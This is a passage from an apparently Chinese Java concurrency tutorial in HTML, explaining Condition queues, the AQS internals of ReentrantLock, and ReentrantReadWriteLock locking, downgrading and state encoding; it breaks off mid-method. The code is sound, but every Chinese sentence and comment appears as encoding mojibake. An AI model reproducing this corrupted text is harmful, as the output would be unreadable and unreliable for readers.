<span class="hljs-comment">// ç”Ÿäº§è€…ï¼šç­‰å¾…é˜Ÿåˆ—ä¸æ»¡ï¼Œé€šçŸ¥é˜Ÿåˆ—ä¸ç©º</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(Object x)</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (count == items.length)
            notFull.await();  <span class="hljs-comment">// ç­‰å¾…é˜Ÿåˆ—ä¸æ»¡</span>
        <span class="hljs-comment">// ç”Ÿäº§...</span>
        notEmpty.signal();    <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…ï¼šé˜Ÿåˆ—ä¸ç©ºäº†</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">// æ¶ˆè´¹è€…ï¼šç­‰å¾…é˜Ÿåˆ—ä¸ç©ºï¼Œé€šçŸ¥é˜Ÿåˆ—ä¸æ»¡</span>
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">take</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>)
            notEmpty.await();  <span class="hljs-comment">// ç­‰å¾…é˜Ÿåˆ—ä¸ç©º</span>
        <span class="hljs-comment">// æ¶ˆè´¹...</span>
        notFull.signal();      <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…ï¼šé˜Ÿåˆ—ä¸æ»¡äº†</span>
        <span class="hljs-keyword">return</span> item;
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ç²¾ç¡®å”¤é†’ï¼šåªå”¤é†’éœ€è¦ç­‰å¾…è¯¥æ¡ä»¶çš„çº¿ç¨‹</li>
<li>é¿å…è™šå‡å”¤é†’ï¼šä½¿ç”¨whileå¾ªç¯æ£€æŸ¥æ¡ä»¶</li>
<li>æ€§èƒ½æ›´å¥½ï¼šä¸éœ€è¦å”¤é†’æ‰€æœ‰çº¿ç¨‹</li>
</ul>
<h3 data-id="heading-165">7.4 ReentrantLockçš„å®ç°åŸç†</h3>
<h4 data-id="heading-166">åŸºäºAQSçš„å®ç°</h4>
<p><strong>ReentrantLockå†…éƒ¨ç»“æ„ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;  <span class="hljs-comment">// å†…éƒ¨åŒæ­¥å™¨ï¼Œç»§æ‰¿è‡ªAQS</span>
    
    <span class="hljs-comment">// å…¬å¹³é”å’Œéå…¬å¹³é”éƒ½ç»§æ‰¿è‡ªSync</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;  <span class="hljs-comment">// ç”±å­ç±»å®ç°ï¼ˆå…¬å¹³/éå…¬å¹³ï¼‰</span>
        
        <span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆéå…¬å¹³æ–¹å¼ï¼‰</span>
        <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
            <span class="hljs-comment">// 1. æ£€æŸ¥é”æ˜¯å¦ç©ºé—²</span>
            <span class="hljs-comment">// 2. CASå°è¯•è·å–é”</span>
            <span class="hljs-comment">// 3. æ”¯æŒå¯é‡å…¥</span>
        }
        
        <span class="hljs-comment">// é‡Šæ”¾é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
            <span class="hljs-comment">// 1. æ£€æŸ¥æ˜¯å¦æ˜¯æŒæœ‰é”çš„çº¿ç¨‹</span>
            <span class="hljs-comment">// 2. stateå‡1</span>
            <span class="hljs-comment">// 3. å¦‚æœstateä¸º0ï¼Œå®Œå…¨é‡Šæ”¾</span>
        }
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>ReentrantLockå†…éƒ¨ä½¿ç”¨AQSå®ç°</li>
<li>å…¬å¹³é”å’Œéå…¬å¹³é”åˆ†åˆ«å®ç°ä¸åŒçš„è·å–ç­–ç•¥</li>
<li>æ‰€æœ‰é”æ“ä½œæœ€ç»ˆéƒ½è°ƒç”¨AQSçš„æ–¹æ³•</li>
</ul>
<h4 data-id="heading-167">å…¬å¹³é”çš„è·å–æµç¨‹</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼šè·å–é”å‰å…ˆæ£€æŸ¥é˜Ÿåˆ—</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…¬å¹³é”ï¼šå…ˆæ£€æŸ¥é˜Ÿåˆ—ï¼Œæœ‰ç­‰å¾…çš„å°±ä¸æ’é˜Ÿ</span>
lock() {
    acquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// è°ƒç”¨AQSçš„acquire</span>
}

tryAcquire(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (é”ç©ºé—²) {
        <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æœ‰ç­‰å¾…çš„ï¼Œä¸æ’é˜Ÿ</span>
        }
        CASè·å–é”;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-comment">// å¯é‡å…¥å¤„ç†...</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥é”æ˜¯å¦ç©ºé—²</li>
<li><strong>å…³é”®ï¼šæ£€æŸ¥é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰ç­‰å¾…çš„çº¿ç¨‹</strong></li>
<li>å¦‚æœæœ‰ç­‰å¾…çš„ï¼Œä¸æ’é˜Ÿï¼Œè¿”å›falseï¼ŒåŠ å…¥é˜Ÿåˆ—ç­‰å¾…</li>
<li>å¦‚æœæ²¡æœ‰ç­‰å¾…çš„ï¼ŒCASè·å–é”</li>
</ol>
<h4 data-id="heading-168">éå…¬å¹³é”çš„è·å–æµç¨‹</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼šæ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éå…¬å¹³é”ï¼šå…ˆå°è¯•ç›´æ¥è·å–ï¼Œå¤±è´¥æ‰æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (CASç›´æ¥å°è¯•è·å–é”) {  <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</span>
        <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// æˆåŠŸ</span>
    }
    acquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// å¤±è´¥æ‰è°ƒç”¨AQSçš„acquire</span>
}

tryAcquire(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (é”ç©ºé—²) {
        CASè·å–é”;  <span class="hljs-comment">// ä¸æ£€æŸ¥é˜Ÿåˆ—ï¼Œç›´æ¥å°è¯•</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>/<span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// å¯é‡å…¥å¤„ç†...</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>å…³é”®ï¼šå…ˆç›´æ¥CASå°è¯•è·å–é”</strong>ï¼ˆå¯èƒ½æ’é˜Ÿï¼‰</li>
<li>å¤±è´¥æ‰è°ƒç”¨acquireï¼Œè¿›å…¥é˜Ÿåˆ—</li>
<li>åœ¨é˜Ÿåˆ—ä¸­ä¹Ÿç›´æ¥å°è¯•è·å–ï¼Œä¸æ£€æŸ¥æ˜¯å¦è½®åˆ°</li>
</ol>
<h4 data-id="heading-169">é”çš„é‡Šæ”¾æµç¨‹</h4>
<p><strong>é‡Šæ”¾æµç¨‹ï¼ˆå…¬å¹³é”å’Œéå…¬å¹³é”ç›¸åŒï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">unlock() {
    release(<span class="hljs-number">1</span>);  <span class="hljs-comment">// è°ƒç”¨AQSçš„release</span>
}

release(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (tryRelease(<span class="hljs-number">1</span>)) {  <span class="hljs-comment">// å°è¯•é‡Šæ”¾é”</span>
        <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
            å”¤é†’ä¸‹ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹;  <span class="hljs-comment">// è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼Œæœªå®Œå…¨é‡Šæ”¾</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li>stateå‡1</li>
<li>å¦‚æœstateå˜ä¸º0ï¼Œå®Œå…¨é‡Šæ”¾é”</li>
<li>å”¤é†’é˜Ÿåˆ—ä¸­ç­‰å¾…çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹</li>
<li>è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</li>
</ol>
<hr/>
<h2 data-id="heading-170">ç¬¬å…«ç«  è¯»å†™é”ï¼ˆReadWriteLockï¼‰</h2>
<h3 data-id="heading-171">8.1 ReadWriteLockæ¥å£</h3>
<h4 data-id="heading-172">è¯»å†™é”çš„è®¾è®¡æ€æƒ³</h4>
<p><strong>ReadWriteLock</strong>æä¾›äº†ä¸¤ç§é”ï¼š</p>
<ul>
<li><strong>è¯»é”ï¼ˆReadLockï¼‰</strong>ï¼šå…±äº«é”ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li><strong>å†™é”ï¼ˆWriteLockï¼‰</strong>ï¼šç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰</li>
</ul>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong></p>
<ul>
<li>è¯»æ“ä½œå¤šã€å†™æ“ä½œå°‘çš„åœºæ™¯</li>
<li>æé«˜å¹¶å‘æ€§èƒ½</li>
<li>è¯»æ“ä½œä¸äº’æ–¥ï¼Œå†™æ“ä½œäº’æ–¥</li>
</ul>
<h4 data-id="heading-173">è¯»é”ä¸å†™é”çš„å…³ç³»</h4>
<p><strong>é”çš„å…¼å®¹æ€§ï¼š</strong></p>

























<table><thead><tr><th>å½“å‰é”çŠ¶æ€</th><th>è¯»é”</th><th>å†™é”</th></tr></thead><tbody><tr><td><strong>æ— é”</strong></td><td>âœ… å¯ä»¥è·å–</td><td>âœ… å¯ä»¥è·å–</td></tr><tr><td><strong>è¯»é”</strong></td><td>âœ… å¯ä»¥è·å–ï¼ˆå¤šä¸ªè¯»é”å…±äº«ï¼‰</td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…è¯»é”é‡Šæ”¾ï¼‰</td></tr><tr><td><strong>å†™é”</strong></td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…å†™é”é‡Šæ”¾ï¼‰</td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…å†™é”é‡Šæ”¾ï¼‰</td></tr></tbody></table>
<p><strong>è§„åˆ™ï¼š</strong></p>
<ul>
<li>å¤šä¸ªè¯»é”å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li>è¯»é”å’Œå†™é”äº’æ–¥</li>
<li>å†™é”å’Œå†™é”äº’æ–¥</li>
</ul>
<h3 data-id="heading-174">8.2 ReentrantReadWriteLock</h3>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è¯»é”ï¼ˆReadLockï¼‰</strong>ï¼šå…±äº«é”ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰ï¼ˆç±»ä¼¼å¤šäººåŒæ—¶çœ‹ä¹¦ï¼‰</li>
<li><strong>å†™é”ï¼ˆWriteLockï¼‰</strong>ï¼šç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰ï¼ˆç±»ä¼¼ä¸€äººç‹¬å å†™ä½œï¼‰</li>
</ul>
<h4 data-id="heading-175">è¯»é”çš„å…±äº«æ€§</h4>
<p><strong>è¯»é”åŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ï¼Œå…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å–ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">ReadLock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();

<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–è¯»é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æ‰§è¡Œè¿™é‡Œ</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰è¯»é”</li>
<li>âœ… è¯»é”æ˜¯å¯é‡å…¥çš„</li>
<li>âŒ è¯»é”ä¼šé˜»å¡å†™é”çš„è·å–ï¼ˆæœ‰è¯»é”æ—¶ä¸èƒ½è·å–å†™é”ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> è¯»å¤šå†™å°‘çš„åœºæ™¯ï¼Œå¦‚ç¼“å­˜ã€é…ç½®è¯»å–</p>
<h4 data-id="heading-176">å†™é”çš„æ’ä»–æ€§</h4>
<p><strong>å†™é”åŸºäºAQSçš„ç‹¬å æ¨¡å¼å®ç°ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å†™å…¥ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">WriteLock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();

<span class="hljs-comment">// åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–å†™é”</span>
writeLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å†™å…¥æ•°æ®ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œè¿™é‡Œ</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰å†™é”</li>
<li>âŒ å†™é”ä¼šé˜»å¡æ‰€æœ‰è¯»é”å’Œå†™é”</li>
<li>âœ… å†™é”æ˜¯å¯é‡å…¥çš„</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> æ•°æ®å†™å…¥ã€æ›´æ–°æ“ä½œ</p>
<h4 data-id="heading-177">é”é™çº§ï¼ˆå†™é”â†’è¯»é”ï¼‰</h4>
<p><strong>é”é™çº§ï¼š</strong> å°†å†™é”é™çº§ä¸ºè¯»é”ï¼ˆ<strong>æ”¯æŒ</strong>ï¼‰</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹ï¼Œå…ˆè·å–è¯»é”ï¼Œå†é‡Šæ”¾å†™é”</li>
<li>è¿™æ ·å¯ä»¥ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼ŒåŒæ—¶å…è®¸å…¶ä»–çº¿ç¨‹è¯»å–</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">ReadLock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
<span class="hljs-type">WriteLock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();

writeLock.lock();  <span class="hljs-comment">// 1. å…ˆè·å–å†™é”</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// æ›´æ–°æ•°æ®</span>
    readLock.lock();  <span class="hljs-comment">// 2. åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹è·å–è¯»é”</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();  <span class="hljs-comment">// 3. é‡Šæ”¾å†™é”ï¼ˆæ­¤æ—¶è¿˜æŒæœ‰è¯»é”ï¼‰</span>
}

<span class="hljs-comment">// ç°åœ¨æŒæœ‰è¯»é”ï¼Œå¯ä»¥è¯»å–æ•°æ®</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();  <span class="hljs-comment">// 4. é‡Šæ”¾è¯»é”</span>
}
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>âš ï¸ <strong>å¿…é¡»åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹è·å–è¯»é”</strong></li>
<li>âš ï¸ <strong>å…ˆè·å–è¯»é”ï¼Œå†é‡Šæ”¾å†™é”</strong>ï¼ˆé¡ºåºå¾ˆé‡è¦ï¼‰</li>
<li>âŒ <strong>ä¸èƒ½å…ˆé‡Šæ”¾å†™é”ï¼Œå†è·å–è¯»é”</strong>ï¼ˆä¸­é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹è·å–å†™é”ï¼‰</li>
</ul>
<h4 data-id="heading-178">é”å‡çº§ï¼ˆè¯»é”â†’å†™é”ï¼‰</h4>
<p><strong>é”å‡çº§ï¼š</strong> å°†è¯»é”å‡çº§ä¸ºå†™é”ï¼ˆ<strong>ä¸æ”¯æŒ</strong>ï¼‰</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸èƒ½åœ¨æŒæœ‰è¯»é”çš„æƒ…å†µä¸‹ç›´æ¥è·å–å†™é”</li>
<li>ä¼šå¯¼è‡´æ­»é”ï¼šå†™é”ç­‰å¾…è¯»é”é‡Šæ”¾ï¼Œä½†è¯»é”ä¸ä¼šé‡Šæ”¾</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¼šå¯¼è‡´æ­»é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    writeLock.lock();  <span class="hljs-comment">// ä¼šä¸€ç›´é˜»å¡ï¼Œå› ä¸ºè¿˜åœ¨æŒæœ‰è¯»é”</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šå…ˆé‡Šæ”¾è¯»é”ï¼Œå†è·å–å†™é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();  <span class="hljs-comment">// å…ˆé‡Šæ”¾è¯»é”</span>
}

writeLock.lock();  <span class="hljs-comment">// å†è·å–å†™é”</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å†™å…¥æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½å‡çº§ï¼š</strong></p>
<ul>
<li>å¦‚æœå¤šä¸ªçº¿ç¨‹éƒ½æŒæœ‰è¯»é”ï¼Œéƒ½å°è¯•å‡çº§ä¸ºå†™é”</li>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½åœ¨ç­‰å¾…å…¶ä»–çº¿ç¨‹é‡Šæ”¾è¯»é”</li>
<li>å½¢æˆæ­»é”ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½åœ¨ç­‰å¾…ï¼Œä½†è°ä¹Ÿä¸é‡Šæ”¾</li>
</ul>
<h3 data-id="heading-179">8.3 ReentrantReadWriteLockçš„å®ç°</h3>
<h4 data-id="heading-180">é«˜16ä½å­˜å‚¨è¯»é”çŠ¶æ€</h4>
<p><strong>stateçš„æ‹†åˆ†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SHARED_SHIFT</span>   <span class="hljs-operator">=</span> <span class="hljs-number">16</span>;
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SHARED_UNIT</span>    <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT);
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_COUNT</span>      <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="hljs-number">1</span>;
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">EXCLUSIVE_MASK</span> <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="hljs-number">1</span>;

<span class="hljs-comment">// è·å–è¯»é”æ•°é‡ï¼ˆé«˜16ä½ï¼‰</span>
<span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sharedCount</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> { <span class="hljs-keyword">return</span> c &gt;&gt;&gt; SHARED_SHIFT; }

<span class="hljs-comment">// è·å–å†™é”æ•°é‡ï¼ˆä½16ä½ï¼‰</span>
<span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">exclusiveCount</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> { <span class="hljs-keyword">return</span> c &amp; EXCLUSIVE_MASK; }
</code></pre>
<p><strong>stateç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">state</span> (<span class="hljs-number">32</span>ä½)
â”œâ”€â”€ é«˜<span class="hljs-number">16</span>ä½ï¼šè¯»é”è®¡æ•°ï¼ˆæœ€å¤š<span class="hljs-number">65535</span>ä¸ªè¯»é”ï¼‰
â””â”€â”€ ä½<span class="hljs-number">16</span>ä½ï¼šå†™é”è®¡æ•°ï¼ˆé‡å…¥æ¬¡æ•°ï¼‰
</code></pre>
<h4 data-id="heading-181">ä½16ä½å­˜å‚¨å†™é”çŠ¶æ€</h4>
<p><strong>å†™é”çš„è·å–ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    <span class="hljs-type">int</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> exclusiveCount(c); <span class="hljs-comment">// è·å–å†™é”è®¡æ•°</span>
    
    <span class="hljs-keyword">if</span> (c != <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// æœ‰è¯»é”æˆ–å…¶ä»–çº¿ç¨‹æŒæœ‰å†™é”</span>
        <span class="hljs-keyword">if</span> (w == <span class="hljs-number">0</span> || current != getExclusiveOwnerThread())
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        
        <span class="hljs-comment">// å¯é‡å…¥</span>
        <span class="hljs-keyword">if</span> (w + exclusiveCount(acquires) &gt; MAX_COUNT)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(c + acquires);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-comment">// å°è¯•è·å–å†™é”</span>
    <span class="hljs-keyword">if</span> (writerShouldBlock() || !compareAndSetState(c, c + acquires))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    setExclusiveOwnerThread(current);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<h4 data-id="heading-182">è¯»é”çš„è·å–å’Œé‡Šæ”¾</h4>
<p><strong>è¯»é”çš„è·å–ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> unused)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-comment">// å¦‚æœæœ‰å†™é”ä¸”ä¸æ˜¯å½“å‰çº¿ç¨‹æŒæœ‰ï¼Œå¤±è´¥</span>
    <span class="hljs-keyword">if</span> (exclusiveCount(c) != <span class="hljs-number">0</span> &amp;&amp; getExclusiveOwnerThread() != current)
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    
    <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> sharedCount(c); <span class="hljs-comment">// è¯»é”è®¡æ•°</span>
    <span class="hljs-keyword">if</span> (!readerShouldBlock() &amp;&amp; r &lt; MAX_COUNT &amp;&amp;
        compareAndSetState(c, c + SHARED_UNIT)) {
        <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–è¯»é”</span>
        <span class="hljs-keyword">if</span> (r == <span class="hljs-number">0</span>) {
            firstReader = current;
            firstReaderHoldCount = <span class="hljs-number">1</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (firstReader == current) {
            firstReaderHoldCount++;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ä½¿ç”¨ThreadLocalå­˜å‚¨æ¯ä¸ªçº¿ç¨‹çš„è¯»é”è®¡æ•°</span>
            <span class="hljs-type">HoldCounter</span> <span class="hljs-variable">rh</span> <span class="hljs-operator">=</span> cachedHoldCounter;
            <span class="hljs-keyword">if</span> (rh == <span class="hljs-literal">null</span> || rh.tid != getThreadId(current))
                cachedHoldCounter = rh = readHolds.get();
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rh.count == <span class="hljs-number">0</span>)
                readHolds.set(rh);
            rh.count++;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }
    <span class="hljs-keyword">return</span> fullTryAcquireShared(current);
}
</code></pre>
<p><strong>è¯»é”çš„é‡Šæ”¾ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> unused)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    
    <span class="hljs-keyword">if</span> (firstReader == current) {
        <span class="hljs-keyword">if</span> (firstReaderHoldCount == <span class="hljs-number">1</span>)
            firstReader = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">else</span>
            firstReaderHoldCount--;
    } <span class="hljs-keyword">else</span> {
